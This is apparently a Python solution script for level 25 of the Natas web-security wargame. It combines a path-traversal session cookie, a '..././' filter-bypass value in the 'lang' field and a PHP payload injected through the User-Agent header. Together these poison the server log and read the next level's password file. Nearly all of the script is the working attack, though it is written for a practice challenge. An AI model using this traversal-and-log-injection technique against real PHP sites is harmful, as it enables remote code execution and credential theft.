from natas import Natas

phpsessid = '/../siemacotam'

post = {
        'lang': '..././logs/siemacotam.log'
        }

natas = Natas('natas25', keep_session=True)
natas.set_cookie('PHPSESSID', phpsessid)
natas.session.headers['USER-AGENT'] = '<?php readfile("/etc/natas_webpass/natas26");/*'

r = natas.get_response(post_data=post)

print(natas.get_cookies())
print(r.text)
